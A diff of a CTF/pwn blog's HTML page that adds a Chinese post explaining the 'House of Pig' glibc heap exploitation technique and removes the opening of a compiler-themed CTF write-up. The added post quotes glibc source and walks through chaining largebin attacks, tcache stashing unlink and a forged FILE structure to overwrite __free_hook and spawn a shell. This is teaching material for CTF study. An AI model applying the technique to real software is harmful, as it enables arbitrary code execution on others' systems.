@@ -156,6 +156,128 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/19/House%20Of%20Pig-%E5%8E%9F%E7%90%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="yhellow">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Pwn进你的心">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/19/House%20Of%20Pig-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Pig-原理</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-19 00:31:32 / Modified: 18:09:13" itemprop="dateCreated datePublished" datetime="2023-04-19T00:31:32+08:00">2023-04-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>3.4k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>3 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="House-Of-Pig"><a href="#House-Of-Pig" class="headerlink" title="House Of Pig"></a>House Of Pig</h2><p>通过 libc-2.31 下的 largebin attack 以及 FILE 结构利用，来配合 libc-2.31 下的 tcache stashing unlink attack 进行组合利用的方法</p>
+<ul>
+<li>运用场景：<ul>
+<li>主要适用于程序中仅有 calloc 函数来申请 chunk，而没有调用 malloc 函数的情况</li>
+</ul>
+</li>
+<li>核心技术点：<ul>
+<li>利用了 glibc 中 <code>IO_str_overflow</code> 函数内会连续调用 malloc，memcpy，free 函数的特点，并且这三个函数的参数都可以由 FILE 结构内的数据来控制</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="House-Of-Pig-原理"><a href="#House-Of-Pig-原理" class="headerlink" title="House Of Pig 原理"></a>House Of Pig 原理</h2><p>House Of Pig 通常是配合 tcache_stashing_unlink 使用的</p>
+<p>在 tcache 中有如下检查：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>但 small chunk 即将进入 tcache 时，就会触发以上检查</li>
+<li>可以发现程序只检查了 bck-&gt;fd 是否等于自己，但 bck 是可以被我们伪造的</li>
+</ul>
+<p>函数 calloc 可以越过 tcache，去直接使用 smallbin，我们可以利用 UAF 修改 small chunk-&gt;bk（同时伪造 fake chunk-&gt;fd），然后使用 calloc 去申请它，并将 chunk-&gt;bk 指向的 fake chunk 给接入 tcache</p>
+<p>这就是 tcache_stashing_unlink 的基本思路，但这个思路在全使用 calloc 的程序中并不适用，因为没有 malloc 就意味着 fake chunk 没有办法被申请出来</p>
+<p>这时就要借助 <code>IO_str_overflow</code> 了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="keyword">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="keyword">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      ......</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="keyword">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">          ......</span><br><span class="line">	  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">	    <span class="keyword">return</span> EOF;</span><br><span class="line">	  new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">/* key1 */</span></span><br><span class="line">	  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">          ......</span><br><span class="line">	    &#125;</span><br><span class="line">	  <span class="keyword">if</span> (old_buf)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">/* key2 */</span></span><br><span class="line">	      <span class="built_in">free</span> (old_buf); <span class="comment">/* key3 */</span></span><br><span class="line">	      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">	      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">          ......</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="keyword">unsigned</span> <span class="keyword">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>对于这个函数我们只需要关注3个函数即可：<code>malloc memcpy free</code></li>
+<li>如果在此之前我们已经布置好了 tcache_stashing_unlink 并把 <code>free hook</code> 设置为 fake chunk，那么 <code>malloc</code> 就会申请到 <code>free hook</code>，<code>memcpy</code> 就会往 <code>free hook</code> 中写入数据，<code>free</code> 就会触发 <code>free hook</code></li>
+</ul>
+<p>劫持 <code>_IO_list_all</code> 将其 vtable 由 _IO_file_jumps 修改为 _IO_str_jumps，那么当原本应该调用 IO_file_overflow 的时候，就会转而调用 IO_str_overflow</p>
+<ul>
+<li>控制 <code>_IO_buf_end</code> 和 <code>_IO_buf_base</code>，我们就可以控制 malloc 的 size 以及写入的数据</li>
+</ul>
+<h2 id="House-Of-Pig-利用姿势"><a href="#House-Of-Pig-利用姿势" class="headerlink" title="House Of Pig 利用姿势"></a>House Of Pig 利用姿势</h2><p>House Of Pig 文字版详细过程：</p>
+<ul>
+<li>先用 UAF 漏洞泄露 libc 地址 和 heap 地址</li>
+<li>再用 UAF 修改 largebin 内 chunk 的 fd_nextsize 和 bk_nextsize 位置，完成一次 largebin attack，将一个堆地址写到 <code>__free_hook-0x8</code> 的位置，使得满足之后的 tcache stashing unlink attack 需要目标 fake chunk 的 bk 位置内地址可写的条件</li>
+<li>先构造同一大小的5个 tcache，继续用 UAF 修改该大小的 smallbin 内 chunk 的 fd 和 bk 位置，完成一次 tcache stashing unlink attack，由于前一步已经将一个可写的堆地址，写到了<code>__free_hook-0x8</code> ，所以可以将 <code>__free_hook-0x10</code> 的位置当作一个 fake chunk，放入到 tcache 链表的头部，但是由于没有 malloc 函数，我们无法将他申请出来</li>
+<li>最后再用 UAF 修改 largebin 内 chunk 的 fd_nextsize 和 bk_nextsize 位置，完成第二次 largebin attack，将一个堆地址写到 <code>_IO_list_all</code> 的位置，从而在程序退出前 flush 所有 IO 流的时候，将该堆地址当作一个 FILE 结构体，我们就能在该堆地址的位置来构造任意 FILE结构了</li>
+<li>在该堆地址构造 FILE 结构的时候，重点是将其 vtable 由 _IO_file_jumps 修改为 _IO_str_jumps，那么当原本应该调用 IO_file_overflow 的时候，就会转而调用如下的 IO_str_overflow</li>
+<li>而该函数是以传入的 FILE 地址本身为参数的，同时其中会连续调用 malloc，memcpy，free 函数，且三个函数的参数又都可以被该 FILE 结构中的数据控制，那么适当的构造 FILE 结构中的数据，就可以实现利用 IO_str_overflow 函数中的 malloc 申请出那个已经被放入到 tcache 链表的头部的包含 <code>__free_hook</code> 的 fake chunk</li>
+<li>紧接着可以将提前在堆上布置好的数据，通过 IO_str_overflow 函数中的 memcpy 写入到刚刚申请出来的包含 <code>__free_hook</code> 的这个 chunk，从而能任意控制 <code>__free_hook</code> ，这里可以将其修改为 system 函数地址</li>
+<li>最后调用 IO_str_overflow 函数中的 free 时，就能够触发 <code>__free_hook</code> ，同时还能在提前布置堆上数据的时候，使其以字符串 “/bin/sh\x00” 开头，那么最终就会执行 system(“/bin/sh”)</li>
+</ul>
+<h2 id="版本对-House-Of-Pig-的影响"><a href="#版本对-House-Of-Pig-的影响" class="headerlink" title="版本对 House Of Pig 的影响"></a>版本对 House Of Pig 的影响</h2><p>适用于 libc-2.31 及以后的新版本 libc </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/04/16/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AE%9E%E6%88%98-%E7%AE%80%E5%8D%95%E7%BC%96%E8%AF%91%E5%99%A83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2038,144 +2160,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86pwn/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/27/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86pwn/" class="post-title-link" itemprop="url">编译原理pwn</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2023-03-27 23:41:48 / Modified: 23:42:57" itemprop="dateCreated datePublished" datetime="2023-03-27T23:41:48+08:00">2023-03-27</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Reappearance/" itemprop="url" rel="index"><span itemprop="name">Reappearance</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>8k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>7 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>Christmas Song 复现</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Christmas_Song: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">01</span>c26c8510f895dce9e8ce077df41f1398428598, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, with debug_info, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
-<ul>
-<li>64位，dynamically，Full RELRO，NX，PIE</li>
-</ul>
-<p><strong>题目分析</strong></p>
-<p>本题目和编译原理有关，给出了源码，这里重点关注一下 <code>parser.y</code> <code>scanner.l</code> 文件</p>
-<p>编译器的构造过程需要两个工具 Flex（用于词法分析）和 Bison（用于语法分析），这两个工具会将上述文件中的指令转化为C代码</p>
-<p>因此，理解了 <code>parser.y</code> <code>scanner.l</code> 文件就相当于理解了该编译器的运行逻辑：</p>
-<p><code>scanner.l</code>：词法分析，判断出源代码中出现的符号</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;com/ast.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYSTYPE ast_t *</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;parser.h&quot;</span></span></span><br><span class="line"><span class="keyword">int</span> line = <span class="number">1</span>;</span><br><span class="line">%&#125;</span><br><span class="line">%option noyywrap</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"><span class="string">&quot;;&quot;</span>             &#123;<span class="keyword">return</span> NEW_LINE;&#125;</span><br><span class="line"><span class="string">&quot;:&quot;</span>             &#123;<span class="keyword">return</span> NEXT;&#125;</span><br><span class="line"><span class="string">&quot;is&quot;</span>            &#123;yylval=ast_operator_init(<span class="string">&#x27;=&#x27;</span>);<span class="keyword">return</span> OPERATOR;&#125;</span><br><span class="line"><span class="string">&quot;gift&quot;</span>          &#123;<span class="keyword">return</span> GIFT;&#125;</span><br><span class="line"><span class="string">&quot;reindeer&quot;</span>      &#123;<span class="keyword">return</span> REINDEER;&#125;</span><br><span class="line"><span class="string">&quot;equal to&quot;</span>      &#123;yylval=ast_operator_init(<span class="string">&#x27;?&#x27;</span>); <span class="keyword">return</span> OPERATOR;&#125;</span><br><span class="line"><span class="string">&quot;greater than&quot;</span>  &#123;yylval=ast_operator_init(<span class="string">&#x27;&gt;&#x27;</span>); <span class="keyword">return</span> OPERATOR;&#125;</span><br><span class="line"><span class="string">&quot;if the gift&quot;</span>   &#123;<span class="keyword">return</span> IF;&#125;</span><br><span class="line"><span class="string">&quot;delivering gift&quot;</span>    &#123;<span class="keyword">return</span> DELIVERING;&#125;</span><br><span class="line"><span class="string">&quot;brings back gift&quot;</span>   &#123;<span class="keyword">return</span> BACK;&#125;</span><br><span class="line"><span class="string">&quot;this family wants gift&quot;</span>                &#123;<span class="keyword">return</span> WANT;&#125;</span><br><span class="line"><span class="string">&quot;ok, they should already have a gift;&quot;</span>  &#123;<span class="keyword">return</span> ENDWANT;&#125;</span><br><span class="line"><span class="string">&quot;Brave reindeer! Fear no difficulties!&quot;</span> &#123;yylval=ast_init_type(AST_AGAIN);<span class="keyword">return</span> AGAIN;&#125;</span><br><span class="line"></span><br><span class="line">&lt;&lt;EOF&gt;&gt;         &#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">[ ]             &#123;<span class="comment">/* empty */</span>&#125;</span><br><span class="line">[\n]            &#123;line++;&#125;</span><br><span class="line">[-+*/]          &#123;yylval=ast_operator_init(yytext[<span class="number">0</span>]); <span class="keyword">return</span> OPERATOR;&#125;</span><br><span class="line">[a-zA-Z]+       &#123;yylval=ast_word_init(yytext); <span class="keyword">return</span> WORD;&#125;</span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+          &#123;yylval=ast_number_init(yytext); <span class="keyword">return</span> NUMBER;&#125;</span><br><span class="line">\<span class="string">&quot;([^\&quot;]*)\&quot;    &#123;yylval=ast_string_init(yytext); return STRING;&#125;</span></span><br><span class="line"><span class="string">(#[^#]*#)       &#123;/* empty */&#125;</span></span><br><span class="line"><span class="string">%%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void yyerror(ast_t **modlue,const char *msg) &#123;</span></span><br><span class="line"><span class="string">    printf(&quot;</span>\nError at %d: %s\n\t%s\n<span class="string">&quot;, line, yytext, msg);</span></span><br><span class="line"><span class="string">    exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>简单来说就是用正则表达式来匹配各个符号</li>
-<li>可以暂时不分析具体的函数</li>
-</ul>
-<p><code>parser.y</code>：语法分析，规定各个符号该如何组织成语句</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;com/ast.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> YYSTYPE ast_t *</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">int</span> <span class="title">yylex</span> <span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">ast_t</span> **modlue, <span class="keyword">const</span> <span class="keyword">char</span>*)</span></span>;</span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%parse-param &#123; <span class="keyword">ast_t</span> **<span class="keyword">module</span>&#125;</span><br><span class="line"></span><br><span class="line">%token GIFT REINDEER DELIVERING BACK STRING</span><br><span class="line">%token WORD NEW_LINE NUMBER OPERATOR</span><br><span class="line">%token AGAIN IF WANT ENDWANT NEXT </span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line">proprame    :   stmts   </span><br><span class="line">                &#123;$$ = *<span class="keyword">module</span> = $<span class="number">1</span>;&#125;</span><br><span class="line">            ;</span><br><span class="line"><span class="comment">/* 语句列表 */</span></span><br><span class="line">stmts   :   stmt <span class="comment">/* 单个语句 */</span></span><br><span class="line">                &#123;$$ = ast_init(AST_STMT, <span class="number">1</span>, $<span class="number">1</span>);&#125;</span><br><span class="line">        |   stmts stmt <span class="comment">/* 多个语句 */</span></span><br><span class="line">                &#123;$$ = ast_add_child($<span class="number">1</span>, $<span class="number">2</span>);&#125;</span><br><span class="line">        ;</span><br><span class="line"><span class="comment">/* 语句 */</span></span><br><span class="line">stmt    :   call_expr <span class="comment">/* 函数调用 */</span></span><br><span class="line">        |   want_stmt <span class="comment">/* want语句 */</span></span><br><span class="line">        |   var_expr NEW_LINE <span class="comment">/* 变量声明 */</span></span><br><span class="line">                &#123;$$ = $<span class="number">1</span>;&#125; </span><br><span class="line">        ;</span><br><span class="line"><span class="comment">/* want语句 */</span></span><br><span class="line">want_stmt :     WANT WORD lists ENDWANT <span class="comment">/* want语句的格式 */</span></span><br><span class="line">                &#123;$$ = ast_init(AST_WANT, <span class="number">2</span>, $<span class="number">2</span>, $<span class="number">3</span>);&#125;</span><br><span class="line">        ;</span><br><span class="line"><span class="comment">/* want结构列表 */</span></span><br><span class="line">lists    :  <span class="built_in">list</span> <span class="comment">/* 单个want结构 */</span></span><br><span class="line">                &#123;$$ = ast_init(AST_LISTS, <span class="number">1</span>, $<span class="number">1</span>);&#125;</span><br><span class="line">        |  lists <span class="built_in">list</span> <span class="comment">/* 多个want结构 */</span></span><br><span class="line">                &#123;$$ = ast_add_child($<span class="number">1</span>, $<span class="number">2</span>);&#125;</span><br><span class="line">        ;</span><br><span class="line"><span class="comment">/* want结构 */</span></span><br><span class="line"><span class="built_in">list</span>    :  IF OPERATOR expr NEXT stmts <span class="comment">/* 相当于IF语句 */</span></span><br><span class="line">                &#123;$$ = ast_init(AST_LIST, <span class="number">3</span>, $<span class="number">2</span>, $<span class="number">3</span>, $<span class="number">5</span>);&#125;</span><br><span class="line">        | <span class="built_in">list</span> AGAIN <span class="comment">/* want结构的格式 */</span></span><br><span class="line">                &#123;$$ = ast_add_child($<span class="number">1</span>, $<span class="number">2</span>);&#125;</span><br><span class="line"><span class="comment">/* 函数调用 */</span></span><br><span class="line">call_expr   : call_expr BACK WORD NEW_LINE <span class="comment">/* 返回值的格式 */</span></span><br><span class="line">                &#123;$$ = ast_add_child($<span class="number">1</span>, $<span class="number">3</span>);&#125;</span><br><span class="line">            | call_expr NEW_LINE <span class="comment">/* 函数调用的格式 */</span></span><br><span class="line">                &#123;$$ = $<span class="number">1</span>;&#125;</span><br><span class="line">            | REINDEER WORD DELIVERING WORD WORD WORD <span class="comment">/* 函数调用的格式 */</span></span><br><span class="line">                &#123;$$ = ast_init(AST_FUNCTION, <span class="number">4</span>, $<span class="number">2</span>, $<span class="number">4</span>, $<span class="number">5</span>, $<span class="number">6</span>);&#125;</span><br><span class="line">            ;</span><br><span class="line"><span class="comment">/* 变量 */</span></span><br><span class="line">var_expr    : GIFT expr <span class="comment">/* 变量格式 */</span></span><br><span class="line">                &#123;$$=$<span class="number">2</span>;&#125;</span><br><span class="line">            ;</span><br><span class="line"><span class="comment">/* 表达式 */</span></span><br><span class="line">expr    :   expr OPERATOR expr </span><br><span class="line">                &#123;$$=ast_init(AST_EXPR, <span class="number">3</span>, $<span class="number">1</span>, $<span class="number">2</span>, $<span class="number">3</span>);&#125;</span><br><span class="line">        |   WORD <span class="comment">/* 符号 */</span>   </span><br><span class="line">                &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">        |   NUMBER <span class="comment">/* 数字 */</span></span><br><span class="line">                &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">        |   STRING <span class="comment">/* 字符串 */</span></span><br><span class="line">                &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">        ;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>
-<ul>
-<li>语法分析的目的就是为了生成语法分析树 AST</li>
-<li>本题目不用探讨这个问题，只需要先了解语法即可</li>
-</ul>
-<p>核心语法如下：</p>
-<ul>
-<li>函数调用：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REINDEER [WORD] DELIVERING [WORD WORD WORD] (BACK [WORD]) NEW_LINE</span><br><span class="line">reindeer [函数名] delivering gift [参数<span class="number">1</span> 参数<span class="number">2</span> 参数<span class="number">3</span>] (brings back gift [返回值]);</span><br></pre></td></tr></table></figure>
-<ul>
-<li>Want 语句：</li>
-</ul>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WANT [WORD] IF [OPERATOR] [expr] NEXT [stmts] AGAIN ENDWANT</span><br><span class="line"><span class="keyword">this</span> family wants gift [变量] <span class="keyword">if</span> the gift [+-*/=?&gt;] [表达式] : [复合语句] Brave reindeer! Fear no difficulties! ok, they should already have a gift;</span><br></pre></td></tr></table></figure>
-<p>分析完程序的语法，就可以进入语义分析阶段了，首先需要了解一个核心宏定义：</p>
